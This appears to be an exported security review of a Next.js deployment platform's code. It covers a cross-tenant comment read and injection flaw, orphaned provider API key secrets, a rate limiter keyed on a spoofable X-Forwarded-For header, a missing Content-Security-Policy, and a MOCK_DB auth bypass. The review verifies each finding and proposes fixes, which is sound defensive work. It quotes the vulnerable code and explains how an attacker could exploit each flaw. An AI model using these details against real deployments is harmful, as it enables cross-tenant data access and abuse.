**Reviewer correction.** The mechanism is correct — there is no tenant predicate and no mitigation — but the impact should be restated in both directions and the severity lowered to low.

Accurate statement: GET and POST on this route authorize only the `id` path segment via `checkProjectAccess`; the `queryId` segment is trusted verbatim. GET reads `query_comments` filtered solely on `queryId`, so a caller who supplies any project they legitimately hold as `id` reads the comment text, `userId`, `userName`, and timestamps of a saved query belonging to any other tenant. POST is the more notable half and the finder did not draw it out: it writes a comment stamped `projectId: id` (the caller's own project), but because GET never filters on `projectId`, that comment renders inside the victim project's Data Lab thread for every member of V — cross-tenant content injection. Attribution cannot be forged (`userId`/`userName` are taken from the server session at lines 89-90) and React escapes the text at DataLab.tsx:1801, so there is no XSS or impersonation.

Severity is low, not medium: `queryId` is an unguessable 20-char Firestore auto-id, and the only two routes that read `Collections.SAVED_QUERIES` are both behind `checkProjectAccess`, so no endpoint discloses a query id to a non-member. The attacker must already hold the id — a former member of V, or someone it leaked to out of band. The exposed data is discussion text, not credentials, query SQL, or result rows, and no privilege escalation follows.

Fix is one line in each method: add `.where('projectId', '==', id)` to the GET query (and ideally verify the saved-query document's `projectId` matches `id` in POST before writing), matching the pattern already used at queries/route.ts:41-42. | Real but narrow broken-access-control (CWE-639). The comments handler authorizes the `id` path segment via checkProjectAccess and then reads/writes query_comments keyed on `queryId` alone, never binding the comment thread to the authorized project (`storageId` is not even destructured, and the `projectId` field POST writes at line 88 is never used as a predicate). Any authenticated tenant with any project of their own can therefore read the comments on — and, more damagingly, inject an attacker-authored comment into — a saved query belonging to a different tenant, with the injected doc stamped with the ATTACKER's projectId so it renders to victim members while evading projectId-scoped cleanup. Severity is low rather than medium because the target `queryId` is an unguessable ~119-bit Firestore auto-ID with no enumeration or leak path anywhere in the codebase; the only realistic actor is a former member of the victim project who retained ids seen while authorized. Fix: resolve the SAVED_QUERIES doc by queryId and reject unless its projectId === id (and storageId === storageId) before touching query_comments, and add `.where('projectId','==',id)` to the GET.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/queries/[queryId]/comments/route.ts — GET (no tenant predicate):
20	        const { id, queryId } = await params;
21	        const access = await checkProjectAccess(session.user.id, id);
22	
23	        if (!access.allowed) {
24	            return NextResponse.json({ error: access.error }, { status: access.status });
25	        }
...
37	        const db = getDb();
38	        const commentsSnapshot = await db
39	            .collection(Collections.QUERY_COMMENTS)
40	            .where('queryId', '==', queryId)
41	            .orderBy('createdAt', 'asc')
42	            .get();

Same file — POST writes projectId that is never read back as a predicate:
70	        const { id, queryId } = await params;
71	        const access = await checkProjectAccess(session.user.id, id);
...
86	        const commentData = {
87	            queryId,
88	            projectId: id,
89	            userId: session.user.id,
90	            userName: session.user.name || session.user.githubUsername,
91	            text: text.trim(),
...
96	        const docRef = await 
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** MITIGATION HUNT — everything I checked and found absent:

1. Handler-level guard: the only authorization in either method is `getSession()` + `checkProjectAccess(session.user.id, id)`. There is no lookup of the saved-query document, no `projectId` predicate, no ownership check. `storageId` is destructured out of the params type but never even read in GET/POST.

2. `checkProjectAccess` (src/middleware/rbac.ts:8-34): resolves the project by `projectId` and checks team membership or personal ownership. It returns `{allowed, project, role}` and knows nothing about `queryId`. Passing your OWN project id satisfies it unconditionally. It cannot mitigate a stale `queryId`.

3. Wrapper/helper: `grep -rn "withProjectAccess|requireProjectAccess|tenantGuard|assertTenant|scopedCollection" src/` returns nothing. `src/middleware/` contains only `rbac.ts`. There is no route-handler wrapper.

4. Framework-level: `src/proxy.ts` (the Next 16 middleware replacement) applies only security headers, subdomain rewriting, in-memory rate limiting, and a cookie-presence check for `/dashboard` and `/new`. It does no tenant scoping and does not even touch `/api/projects/*` beyond rate limiting.

5. Data-layer: `getDb()` (src/lib/firebase.ts:53-64) returns the raw `Firestore` admin instance — no tenant-scoped wrapper. There is no `firestore.rules` file, and the admin SDK bypasses security rules regardless.

6. Tests: no API-route tests exist at all (all `*.test.ts` are under `src/lib`, `src/cli`, `src/components`). Nothing pins the safe behaviour.

7. Sibling-route comparison — the finder's supporting claim is correct but incomplete. `queries/route.ts:41-42` does carry `.where('projectId','==',id).where('storageId','==',storageId)`. The nearer sibling `queries/[queryId]/route.ts` (PATCH/DELETE) does NOT carry a projectId predicate either — it substitutes an ownership check, `if (doc.data()?.userId !== session.user.id) return 403` (lines 38-40, 84-86). So the feature has two different guard styles, and the comments route has neither. That strengthens the claim rather than excusing it.

VERDICT: the code says exactly what is claimed. Both directions are affected, and the write side is the half the finder under-stated: POST stamps `projectId: id` (the attacker's own project) at line 88, but since GET ignores `projectId`, the injected comment surfaces inside the VICTIM project's Data Lab thread for every member of V. Attribution cannot be spoofed (`userId`/`userName` come from the server session), and React escapes `{c.text}` at DataLab.tsx:1801 (no `dangerouslySetInnerHTML

</details>

### 🔵 LOW — Provider API key secrets are orphaned in Secret Manager when a storage connector is deleted
`webhooks-billing-8` · `src/app/api/projects/[id]/storage/route.ts:315`  _(reviewers changed severity: medium → **low**)_

**Failure scenario.** A user connects a PlanetScale (or Neon / Supabase / MongoDB Atlas) connector and supplies `providerApiKey` — an org-scoped provider admin token used at src/lib/gcp/external-sync.ts:139-186 to create and delete database passwords. Later they delete the connector via `DELETE /api/projects/<id>/storage?storageId=<sid>`. `deployify-<projectId>-<sid>-conn` is destroyed but `deployify-<projectId>-<sid>-apikey` is left in GCP Secret Manager forever, with whatever IAM bindings were added to it by grantSecretAccess (src/lib/gcp/secrets.ts:70-137, called from remediation-utils.ts:202/228 for tenant Cloud Run service accounts). Firestore no longer references it, so no UI, audit view, or rotation job ca

**Impact.** Long-lived third-party provider admin tokens accumulate indefinitely in the platform's Secret Manager after the customer believes they revoked them, still readable by tenant service accounts that were granted secretAccessor while the connector existed. The user has no way to discover or remove them, and Deployify has no inventory of them — a persistent, invisible credential store that grows with e

**Reviewer correction.** The factual core holds and is in fact broader than reported, but the framing as a medium-severity security vulnerability is wrong. Accurate restatement:

"Provider API key secrets are never deleted from Secret Manager. `deleteSecret` is called exactly once in the codebase (src/app/api/projects/[id]/storage/route.ts:317) and only ever for the `deployify-<projectId>-<storageId>-conn` id. The `deployify-<projectId>-<storageId>-apikey` secret — created at storage/route.ts:165 (POST), storage/route.ts:395 (PATCH) and external-sync.ts:543 (token rotation) — has no delete path anywhere. Connector deletion leaves it behind, and `DELETE /api/projects/[id]` leaves BOTH the `-conn` and `-apikey` secrets behind, since `deleteProject` (src/lib/db.ts:1125-1143) only removes Firestore documents. Secrets are created with `replication: { automatic: {} }` and no `expireTime`, so nothing expires them, and `grantSecretAccess` bindings (remediation-utils.ts:201-203, 227-229) persist on the orphan.

This is a credential-retention and resource-leak defect, not an exploitable vulnerability. The DELETE handler is correctly authorized (session + checkProjectAccess + viewer rejection at lines 262-276), the secret id is namespaced by a non-reusable random `storageId`, and reading the orphan requires IAM on Deployify's own GCP project — which already grants access to every live secret. The concrete harm is that an org-scoped provider admin token (PlanetScale/Neon/Supabase/Atlas) that a customer intentionally disconnected stays live in Deployify's Secret Manager indefinitely, enlarging blast radius on future compromise and breaking the deletion expectation, plus unbounded accumulation against the Secret Manager per-project quota.

Fix: in the DELETE handler, mirror the `-conn` block with `if (storageConfig.providerApiKeySecretId) await deleteSecret(\`deployify-${id}-${storageId}-apikey\`)`, and add the same sweep over `project.storageConfigs` to the project DELETE route before `deleteProject(id)`."

Separately noted while verifying (out of scope for this claim, but a real bug worth its own ticket): external-sync.ts:542 passes `storage.providerApiKeySecretId` — a FULL resource name `projects/X/secrets/Y/versions/latest` — into `upsertSecret`, which expects a bare secret id and interpolates it as `projects/<gcpProjectId>/secrets/<that whole string>`, producing a malformed secret name on Neon token rotation. | Directionally correct and the mechanism is exactly right, but it is a secret-lifecycle/incomplete-cleanup defect (CWE-459), not an exploitable vulnerability, so medium overstates it.

Accurate restatement: DELETE /api/projects/<id>/storage?storageId=<sid> (src/app/api/projects/[id]/storage/route.ts:314-318) deletes only `deployify-<projectId>-<sid>-conn` and never `deployify-<projectId>-<sid>-apikey`, which POST created at line 164-165. The orphaned secret holds a long-lived, org-scoped provider admin token (used at src/lib/gcp/external-sync.ts:139-186 to create and delete PlanetScale database passwords; equivalents for Neon/Supabase/Atlas at 196-224). Confirmed no other cleanup exists: deleteSecret appears exactly twice repo-wide (definition in src/lib/gcp/secrets.ts and the conn-only call at route.ts:317), there is no sweeper cron, and — a path the original finder did not check — project deletion (src/app/api/projects/[id]/route.ts:289-385) and deleteProject in src/lib/db.ts also never touch Secret Manager, so the credential outlives the entire project and tenant. Two details the claim missed: (1) when a connector was created with providerApiKey but no connectionString (secretOnly/autoSync connectors), connectionStringSecretId is undefined, the guard at line 315 is false, and DELETE removes no secret at all; (2) the apikey id is also reconstructed as a rotation fallback at src/lib/gcp/external-sync.ts:542.

Severity is low, not medium, because there is no attacker in the loop: the actor who triggers the leak is the credential's own owner, the orphaned secret lives in the platform's GCP project and is unreadable by any tenant, and no cross-tenant read or privilege escalation results. storageId is time-plus-random (`storage_${Date.now().toString(36)}${random6}`), so no new connector can collide with and silently inherit a stale secret. Real impact is indefinite retention of a high-value third-party credential past the user's only means of revoking it, which converts to damage only if the platform's GCP project or service account is separately compromised. Fix is a three-line sibling block deleting `deployify-${id}-${storageId}-apikey` when storageConfig.providerApiKeySecretId is set — and, separately, the same cleanup belongs in the project-delete path.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/route.ts — creation of BOTH secrets:
  156	        if (finalConnectionString) {
  157	            // Store connection string in GCP Secret Manager
  158	            const secretId = `deployify-${id}-${storageId}-conn`;
  159	            connectionStringSecretId = await upsertSecret(secretId, finalConnectionString);
  160	        }
  161	
  162	        if (providerApiKey) {
  163	            // Store provider API key in GCP Secret Manager
  164	            const apiKeySecretId = `deployify-${id}-${storageId}-apikey`;
  165	            providerApiKeySecretId = await upsertSecret(apiKeySecretId, providerApiKey);
  166	        }

src/app/api/projects/[id]/storage/route.ts — DELETE handler, only the -conn secret is removed:
  314	        // 2. Delete from Secret Manager if applicable
  315	        if (storageConfig.connectionStringSecretId) {
  316	            const secretId = `deployify-${id}-${storageId}-conn`;
  317	            await deleteSecret(secretId);
  318	        }
  319
  320	        // 3. Remove from Project in Firestore
  321	        const f
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted specifically for a guard the finder could have missed and found none.

1. The DELETE handler's secret cleanup block (storage/route.ts:314-318) is guarded on `connectionStringSecretId` and constructs only the `-conn` id. There is no second block for `-apikey`, and no helper is invoked that would sweep it.

2. `deleteSecret` is called EXACTLY ONCE in the entire repo. `rg -n "deleteSecret" src` returns only the import at storage/route.ts:6 and the single call at storage/route.ts:317. So there is no wrapper, cron reaper, or lifecycle helper anywhere.

3. `src/lib/gcp/secrets.ts` `upsertSecret` creates secrets with `replication: { automatic: {} }` only — no `expireTime`, no `ttl`, no rotation policy. Grepping `expireTime|ttl|rotationPeriod` across `src/lib/gcp/*.ts` hits only CDN TTLs in loadbalancer.ts. So GCP will not expire the secret on its own.

4. No orphan scanner covers it. The only "orphan" logic (`src/lib/gcp/discovery.ts`, `src/components/StorageSection.tsx:689`) enumerates orphaned *databases/branches*, not Secret Manager entries.

5. No test pins the behaviour. There is no `storage/route.test.ts`; the only storage-adjacent test is `src/app/api/projects/[id]/storage/[storageId]/query/route.test.ts`.

6. I also checked the broader lifecycle and the gap is WIDER than claimed: `DELETE /api/projects/[id]` (route.ts:289-387) cleans Cloud Run, Artifact Registry, cron jobs and domain mappings, then calls `deleteProject(id)` — which (db.ts:1125-1143) only batch-deletes Firestore deployment docs and the project doc. Neither the `-conn` nor the `-apikey` secret is deleted on project deletion. So deleting the whole project orphans both secrets, not just the api key.

7. The claimed privilege of the leaked token is accurate: `external-sync.ts:141-184` uses `providerApiKey` as a PlanetScale org-scoped bearer token to POST new `readwriter` passwords and DELETE existing ones. `rotateProviderToken` (external-sync.ts:520-543) uses the Neon key to mint new account-level API keys. So it is a genuinely privileged credential.

Where the claim overreaches is severity, not fact. This is not attacker-reachable and crosses no authorization boundary:
- The DELETE handler is properly gated (session check at 262-265, `checkProjectAccess` at 268-272, viewer rejection at 274-276), so only an authorized editor/admin triggers it.
- The orphaned secret lives in Deployify's own GCP project. Reading it requires IAM on that project — an actor who has that can already read every live secret, so nothing new is exposed to them.
- The secret id `deployify-<project

</details>

### 🔵 LOW — Both rate limiters trust the first `X-Forwarded-For` entry, which is client-supplied, so the platform's only abuse control is bypassed with one header
`xss-frontend-sec-5` · `src/proxy.ts:116`  _(reviewers changed severity: medium → **low**)_

**Failure scenario.** Google's front ends append the real client IP to a caller-supplied `X-Forwarded-For` rather than replacing it, so `split(',')[0]` returns whatever the caller sent. An attacker issues each request with `X-Forwarded-For: <random IPv4>` and both limiters see a fresh identity every time: `checkRateLimit` at src/proxy.ts:23 creates a new bucket, and `rateLimitMap` in the collector never accumulates. The 30-requests-per-minute cap on `/api/auth/*` and the 20-per-minute cap on `/api/v1/collect` are both nullified. `x-real-ip` is only consulted when XFF is absent, so it is not a fallback check. The same spoofed value is what gets persisted as the visitor IP in `logEdgeEvent` (src/app/api/v1/proxy/[s

**Impact.** No effective rate limiting anywhere on the platform. Unbounded unauthenticated requests to `/api/v1/collect`, each producing a Firestore document write plus a BigQuery streaming insert (lines 89-99) — direct cost amplification and analytics poisoning with attacker-chosen source IPs. The same bypass removes the only brute-force / enumeration control in front of the auth and webhook routes. The in-m

**Reviewer correction.** Both in-memory rate limiters key on the leftmost, client-supplied `X-Forwarded-For` entry, so any anonymous caller gets a fresh bucket per request by rotating one header. The mechanism and reachability are correct, but the control being bypassed was never load-bearing: the store is a per-process `Map` on autoscaling Cloud Run (no shared backend, as the code's own "use Redis in production" comment concedes), the proxy key is `${ip}:${pathname}` so one honest IP already gets 100/min against each of ~86 routes, and the "strict" 30/min bucket fronts `/api/auth/` where only GitHub OAuth callback/login/logout exist — there is no password endpoint to brute-force. No authentication or authorization boundary is crossed and no data is exposed; the realistic impact is cost/DoS amplification against `/api/v1/collect`, whose per-request Firestore write plus BigQuery streaming insert is the actual money sink — and that route's dominant defect is its unauthenticated `apiKey === 'deployify-dashboard-internal'` bypass at line 66, not the spoofable limiter key. Correct fix is still worth doing (derive the client IP from the rightmost untrusted hop given a known proxy count, and move the limiter to a shared store), but this is a hardening gap, not a medium-severity control bypass. | Both rate limiters take the left-most, client-controlled `X-Forwarded-For` entry, so an attacker rotating that header gets an unlimited number of fresh buckets. This is accurate as a mechanism, but it degrades a defence-in-depth control rather than bypassing "the platform's only abuse control": 79 of 84 API routes enforce their own session auth (and the 5 unauthenticated ones use HMAC signatures, a cron bearer secret, or an apiKey), there is no password endpoint to brute-force, and the limiter it defeats is a module-scoped in-memory `Map` on autoscaling Cloud Run — per-instance, per-path, reset on every cold start, and explicitly labelled "in-memory for development, use Redis in production" at src/lib/security/index.ts:5. Project-subdomain traffic never reaches the limiter at all (early `NextResponse.rewrite` at src/proxy.ts:109). Real impact is cost/noise amplification against `/api/v1/collect` (Firestore + BigQuery writes, using a project apiKey that is public by design in `public/deployify-insights.js` via `data-api-key`), and it should be fixed alongside moving the counter to a shared store — but the fix to the header alone buys almost nothing while the store stays in-process.

**Verified code:**

```ts
src/proxy.ts:20-21
    // In-memory rate limit store (Edge-compatible)
    const rateLimitStore = new Map<string, { count: number; resetAt: number }>();

src/proxy.ts:45-49
    // Routes that should be rate limited more strictly
    const strictRateLimitRoutes = [
        '/api/auth/',
        '/api/webhooks/',
    ];

src/proxy.ts:114-124
            // Rate limiting for API routes
            if (pathname.startsWith('/api/')) {
                const ip = request.headers.get('x-forwarded-for')?.split(',')[0] ||
                    request.headers.get('x-real-ip') ||
                    'unknown';

                // Determine rate limit based on route
                const isStrictRoute = strictRateLimitRoutes.some(route => pathname.startsWith(route));
                const limit = isStrictRoute ? 30 : 100;

                const rateLimitResult = checkRateLimit(`${ip}:${pathname}`, limit);

src/app/api/v1/collect/route.ts:10-13
    // Simple in-memory rate limiting for development
    const rateLimitMap = new Map<string, { count: number; lastReset: number }>();
    const RATE_LIMIT
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read src/proxy.ts end to end (215 lines), src/app/api/v1/collect/route.ts, src/lib/security/index.ts, next.config.ts, the Dockerfile, and .next/server/middleware-manifest.json.

CODE IS AS CLAIMED. src/proxy.ts:116 and src/app/api/v1/collect/route.ts:28 both do `headers.get('x-forwarded-for')?.split(',')[0]` with zero trusted-proxy or hop-count logic. A third site, src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:17, does the same. Both stores are plain module-level `Map`s (src/proxy.ts:21, collect/route.ts:11); src/lib/security/index.ts:5 literally comments "in-memory for development, use Redis in production".

REACHABLE BY AN ANONYMOUS ACTOR. The build manifest confirms src/proxy.ts is wired as live middleware with matcher `^(?:\/(_next\/data\/[^/]{1,}))?(?:\/((?!favicon.ico|public\/).*))...$`, so every `/api/*` request hits line 115-124. No auth check precedes the rate-limit block, no NODE_ENV or MOCK_DB gate guards it (the only dev bypasses are at lines 160 and 165, inside the /dashboard branch, well after the limiter). Deployment is Cloud Run behind Google front ends (Dockerfile header: "for deploying the Deployify dashboard itself to Cloud Run"), where XFF is appended, not replaced, so `[0]` is caller-controlled. Precondition: one HTTP header. Confirmed reachable.

WHERE THE CLAIM OVERSTATES — the title's "the platform's only abuse control is bypassed" implies a meaningful control is being defeated. It was already not one:
1. Per-instance, per-process store. `output: 'standalone'` on autoscaling Cloud Run means each container has its own Map. With correct client IPs the effective ceiling is already 100/min x N instances, and nothing shares state. The finder's own quoted comment concedes this.
2. Key is `${ip}:${pathname}` (line 124), not `${ip}`. A single honest IP already gets 100/min against each of ~86 API routes independently — thousands of requests/min without spoofing anything.
3. The strict 30/min bucket guards nothing sensitive. `strictRateLimitRoutes` is `['/api/auth/', '/api/webhooks/']` (lines 46-49), but `ls src/app/api/auth/` returns only callback, github, logout — auth is GitHub OAuth, there is no password endpoint, so this is not credential brute-force protection. The webhook route is separately HMAC-verified (verifyGitHubWebhookSignature, src/lib/security).
4. `checkRateLimit` in src/lib/security/index.ts has zero importers — only `securityHeaders` is imported from that module — so that copy is dead code for this purpose and the claim's "both rate limiters" refers correctly to proxy.ts and collect/route.ts, not to it

</details>

### 🔵 LOW — No Content-Security-Policy is emitted anywhere, on the dashboard or on proxied tenant pages
`xss-frontend-sec-6` · `src/proxy.ts:12`  _(reviewers changed severity: medium → **low**)_

**Failure scenario.** `grep -rn "Content-Security-Policy\|contentSecurityPolicy\|frame-ancestors" src/ next.config.ts` returns nothing. Consequences that are concrete rather than theoretical: (1) the dashboard loads a third-party script from `https://checkout.razorpay.com/v1/checkout.js` (src/app/billing/page.tsx:228) with no `script-src` restriction and no SRI, so a compromise of that CDN yields arbitrary JS in a page that renders decrypted environment variables and database result sets; (2) the reverse proxy rewrites every tenant response and re-serves it from `<slug>.<app-domain>` (src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:196-203) with no CSP and with the tenant's own `x-frame-options` explicitly strip

**Impact.** Removes the last containment layer for every script-injection path in the product. Because the platform intentionally hosts customer-controlled HTML on subdomains of its own origin, script execution on `*.<app-domain>` is not a hypothetical — it is a supported product feature — and there is no policy limiting what that script may connect to, load, or frame.

**Reviewer correction.** Accurate restatement: "The application emits no Content-Security-Policy (and no Strict-Transport-Security) on any response. This is a defense-in-depth hardening gap, not an exploitable weakness in the current codebase — no XSS primitive exists for a CSP to backstop, and both concrete consequences named in the claim are wrong."

The factual core is true and reachable, so I do not refute it. But the claimed severity and both claimed mechanisms do not survive scrutiny:

1. WRONG MECHANISM — Razorpay CDN compromise. The claim's only "concrete rather than theoretical" consequence is that a compromise of checkout.razorpay.com yields arbitrary JS because there is no script-src. CSP does not mitigate this threat. Any workable CSP here must allowlist checkout.razorpay.com, because src/app/billing/page.tsx:228 deliberately loads it; a compromised allowlisted origin serves malicious JS that passes script-src unconditionally. The control that addresses CDN compromise is Subresource Integrity, and Razorpay's checkout.js is a mutable, unversioned endpoint that self-loads sub-resources and is not SRI-compatible. So the load-bearing impact argument is technically incorrect.

2. ALREADY MITIGATED — frame-ancestors / clickjacking. src/proxy.ts:15 sets 'X-Frame-Options': 'DENY' on every response path (the normal NextResponse.next(), the 429 rate-limit response, and the 500 catch-all). Every current major browser honors XFO: DENY. The absence of frame-ancestors is a modernization nit, not a clickjacking exposure.

3. NO XSS SINK TO BACKSTOP. I grepped the whole of src/ for dangerouslySetInnerHTML, innerHTML, eval(, new Function(, document.write, srcdoc, and javascript: URLs. Exactly one hit exists — src/app/dashboard/layout.tsx:27 — and its payload is a hardcoded literal with no interpolation. package.json contains no markdown renderer, no HTML sanitizer, and no highlighter. React auto-escapes everywhere else. CSP's value here is guarding against a future XSS bug, not an existing one.

4. NOT A DEFECT AT ALL — "proxied tenant pages." Injecting a CSP into customer-deployed sites would be actively wrong behavior for a PaaS; Vercel, Netlify and Render do not dictate CSP for tenant apps. Tenant content is arbitrary by design, is served on its own subdomain, and the session cookie is host-only (src/lib/auth.ts:117-123 sets httpOnly/secure/sameSite:lax/path:'/' with no `domain` attribute), so tenant subdomains never receive it.

Worth noting for whoever fixes this: a naive `script-src 'self'` would break the app. The Next.js App Router injects inline hydration bootstrap scripts, and src/app/dashboard/layout.tsx:27 is an inline script — a real fix needs a nonce-based policy plumbed through proxy.ts, which is why this is a hardening project rather than a one-line header addition. | Accurate restatement: "The dashboard emits no Content-Security-Policy, so there is no defense-in-depth backstop should an HTML-injection bug ever be introduced, and no restriction on which origins may execute script in the dashboard context."

Corrections to the original claim:
- Drop the frame-ancestors component entirely. `X-Frame-Options: DENY` is already set at src/proxy.ts:15 and src/lib/security/index.ts:120 and is honored by all current browsers; clickjacking is mitigated.
- Drop the Razorpay-CDN-compromise scenario. A working CSP must allowlist checkout.razorpay.com, so CSP does not mitigate that scenario; and SRI is not viable against a versionless mutable loader URL. If third-party-script risk is the concern, the correct control is vendoring or a Razorpay-supported pinned build, not CSP.
- Drop "or on proxied tenant pages." Injecting a platform CSP into proxied customer HTML in src/app/api/v1/proxy/[slug]/[[...path]]/route.ts would break arbitrary customer applications. This is not a defect to fix.
- Note the finder missed a second header table at src/lib/security/index.ts:117-124, used by the API routes; any CSP work must cover both it and src/proxy.ts:12.

Remediation is still worth doing (add a CSP to the src/proxy.ts securityHeaders table, report-only first, allowlisting checkout.razorpay.com, fonts.googleapis.com/fonts.gstatic.com and self, and scoped to exclude the /api/v1/proxy/* tenant paths), but this is hardening on a codebase with no reachable injection sink, which is low, not medium.

**Verified code:**

```ts
src/proxy.ts:11-18 — the complete header set, no CSP:
```
// Security headers to apply
const securityHeaders = {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
};
```

src/proxy.ts:198-206 — matcher proves every anonymous request hits this:
```
export const config = {
    matcher: [
        '/((?!favicon.ico|public/).*)',
    ],
};
```

src/proxy.ts:139-143 — headers applied to the normal response path:
```
const response = NextResponse.next();
for (const [key, value] of Object.entries(securityHeaders)) {
    response.headers.set(key, value);
}
```

next.config.ts (headers block) — the only configured header, and the comment is misleading since middleware sets no CSP either:
```
  // Security headers are handled by middleware
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'X-DNS-Prefetch-Control',
            value: 'on',
   
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** My lens is reachability and exploitability, so I tried to break the claim on those axes and could not break the existence/reachability half, but did break the impact half.

REACHABILITY — survives. src/proxy.ts exports `proxy()` with `config.matcher = ['/((?!favicon.ico|public/).*)']`, so it runs on essentially every request including anonymous ones. The `securityHeaders` constant at lines 12-18 is applied unconditionally at three points (the rewrite for tenant subdomains, the 429 response, the normal NextResponse.next(), and the 500 catch-all). There is no dev-only gate, no admin precondition, and no dead code involved — the CSP-less header set is what a logged-out anonymous visitor receives in production with NODE_ENV=production and MOCK_DB unset. The NODE_ENV==='development' and MOCK_DB==='true' branches in proxy.ts only affect the dashboard auth bypass, not the header set. So an unprivileged actor trivially "reaches" the cited line.

FACT CHECK — the grep claim holds. `grep -rniE "content-security-policy|contentSecurityPolicy|frame-ancestors|script-src|helmet|Strict-Transport"` across all .ts/.tsx/.js/.mjs/.json/.yml/.yaml/Dockerfile, excluding node_modules and .next, returned zero matches. next.config.ts `headers()` emits only X-DNS-Prefetch-Control: on. The finder's evidence is accurate and I reproduced it independently.

EXPLOITABILITY — this is where the claim fails. A missing header is only a vulnerability to the extent that some attack it would have blocked is actually possible. I checked each named consequence:

The Razorpay argument inverts how CSP works. CSP allowlists origins; it cannot distinguish a legitimate script from a trojaned one served by the same allowlisted origin. Since the app intentionally loads checkout.razorpay.com, any CSP must permit it, so a CDN compromise defeats CSP by construction. Only SRI addresses that, and Razorpay's checkout endpoint does not support SRI. The finder presented this as the concrete, non-theoretical impact, and it is simply not a thing CSP does.

The clickjacking/frame-ancestors angle is already covered by X-Frame-Options: DENY at src/proxy.ts:15, which I read directly and confirmed is set on every response path.

That leaves CSP-as-XSS-mitigation, which is genuine but purely prospective: I found no injection sink. The sole dangerouslySetInnerHTML is a constant. I also chased two adjacent things that looked like they might be real sinks and both were dead ends — the unescaped template interpolation of `project.analyticsApiKey` into a script tag attribute in src/app/api/v1/proxy/[slug]/[

</details>


## ⚖️ Disputed — reviewers split, needs your judgement  <sub>(3)</sub>

### 🟡 MEDIUM — `MOCK_DB=true` disables the dashboard authentication gate in any NODE_ENV, including production
`ops-config-supply-5` · `src/proxy.ts:165`  _(reviewers changed severity: high → **medium**)_

**Failure scenario.** `MOCK_DB=true` is set in the Cloud Run service's environment — plausible because the same variable is threaded through ~20 production API handlers as a live runtime branch, not a test-only shim (e.g. src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:146, src/app/api/projects/[id]/storage/[storageId]/branch/route.ts:127/186/252/328, .../queries/route.ts:27, .../audit/route.ts:33, .../metrics/route.ts:29). With that single variable present, `proxy()` returns the response unchanged for every `/dashboard/*` and `/new` request, so an attacker with no cookie at all reaches the dashboard shell and every RSC payload it triggers. It also silently rewires those storage endpoints onto mock branches in p

**Impact.** One misplaced environment variable in the Cloud Run service config converts the platform from authenticated to open, with no error, no log line, and no startup validation to catch it. The variable is not listed in env.example, so nothing documents that setting it is catastrophic.

**Reviewer correction.** Accurate restatement, scoped to the cited location: src/proxy.ts:165 contains a `|| process.env.MOCK_DB === 'true'` disjunct that is not conjoined with a NODE_ENV check, unlike the `token === 'deleted'` guard five lines above. This is a real inconsistency and a defense-in-depth nit, but it is not an authentication bypass at this location for two independent reasons. First, the block it short-circuits (lines 169-177) is a cookie-*presence* test, not authentication — it never calls verifySessionToken — so any anonymous request carrying `Cookie: deployify_session=anything` already passes it today with MOCK_DB unset, and gains nothing: dashboard/layout.tsx re-checks via getSession() and renders only a redirect stub, and every API route re-checks independently. Second, MOCK_DB is a test-harness flag, not a production knob: all 33 assignment sites in the repo are inside *.test.ts files, it appears in no manifest, no Dockerfile, no CI workflow, no .env.local, and not even env.example, and it cannot be influenced by any HTTP input. The genuine MOCK_DB exposure — the one that would matter if the flag were ever set on a production revision — is at src/lib/auth.ts:99, where getSession() returns a hard-coded enterprise-admin MOCK_SESSION for cookieless requests; that line alone would grant full access to the dashboard and all ~86 API routes whether or not proxy.ts:165 existed, which makes the proxy.ts occurrence a non-load-bearing duplicate. Track proxy.ts:165 as a low-severity hygiene fix (add `NODE_ENV !== 'production' &&`, or better, add a startup assertion in validateConfig() that refuses to boot when MOCK_DB is truthy under NODE_ENV=production); attribute the actual severity to the auth.ts:99 finding. | Accurate restatement: `MOCK_DB=true` is a genuine runtime env read that is honoured in a production container, but the thing it disables at src/proxy.ts:165 is a cookie-PRESENCE check, not an authentication gate — so line 165 is not where the damage is. src/proxy.ts never calls `verifySessionToken`, `jwtVerify`, or `getSession` (grep count = 0); its only gates are `if (!sessionCookie && !isRscRequest)` and `if (!sessionCookie && isRscRequest)`. Any unauthenticated attacker already walks past that gate today, with MOCK_DB unset, by sending `Cookie: deployify_session=x`. What line 165 removes therefore has no authentication value on its own. The consequential bypass under the same flag is src/lib/auth.ts:97-99, where `getSession()` returns the hard-coded `MOCK_SESSION` (user `audit-test` / 'Plexaverse Admin', subscription tier `enterprise`) to every cookie-less caller — that is what actually opens the dashboard layout (src/app/dashboard/layout.tsx renders a login-redirect stub when `getSession()` returns null, and MOCK_SESSION defeats it) and all ~86 API routes. Reporting this at src/proxy.ts:165 as "high" double-counts a root cause that is separately and correctly reported against src/lib/auth.ts, and pins it on the weaker of the two sites. Severity for this claim as scoped: medium — a latent config landmine, not an independently exploitable defect. Two incidental corrections to the claim text: (a) `/new` is worth flagging more than `/dashboard`, because src/app/new/layout.tsx contains no auth whatsoever and src/app/new/page.tsx is `'use client'`, so the presence-only proxy check is the sole gate there; (b) "an attacker with no cookie at all reaches the dashboard shell and every RSC payload it triggers" overstates line 165 alone — with MOCK_DB unset the same attacker reaches the shell with any junk cookie, and with MOCK_DB set it is auth.ts that hands them a real enterprise session.

**Verified code:**

```ts
src/proxy.ts:154-178 — the block in question, read verbatim. Note the gates test cookie PRESENCE only; `token` is decoded at 157 and never verified:
```
154        // Check authentication for protected dashboard routes
155        if (pathname.startsWith('/dashboard') || pathname.startsWith('/new')) {
156            const sessionCookie = request.cookies.get('deployify_session');
157            const token = sessionCookie ? decodeURIComponent(sessionCookie.value) : '';
158
159            // Allow logout to work in dev
160            if (process.env.NODE_ENV === 'development' && token === 'deleted') {
161                return NextResponse.redirect(new URL('/login', request.url));
162            }
163
164            // Bypass for local development
